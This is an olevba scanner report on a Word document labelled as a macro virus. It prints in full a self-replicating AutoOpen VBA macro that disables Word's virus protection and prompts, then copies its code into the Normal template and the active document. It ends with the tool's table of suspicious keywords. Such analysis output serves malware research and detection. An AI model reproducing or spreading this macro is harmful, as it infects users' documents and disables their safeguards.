olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-5d2e32724b089ffb5dde1660dd1a0138546372de
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-5d2e32724b089ffb5dde1660dd1a0138546372de - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

On Error Resume Next

Options.SaveNormalPrompt = 0

Options.ConfirmConversions = 0

FA65 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Options.VirusProtection = 0

DT71 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines

Application.EnableCancelKey = 0

If Left(ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IS41 = ActiveDocument.VBProject.VBComponents.Item(1)

SQ26 = True

End If

If Left(NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then

Set IS41 = NormalTemplate.VBProject.VBComponents.Item(1)

TR25 = True

End If

If TR25 <> True And SQ26 <> True Then GoTo NE9

If TR25 = True Then IS41.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, FA65 - 1))

If SQ26 = True Then IS41.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DT71 - 1))

With IS41.CodeModule

For x = 2 To (IS41.CodeModule.CountOfLines - 1) Step 2

.replaceline x, "'" & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter

Next x

End With

NE9:

If DT71 <> 0 And FA65 = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

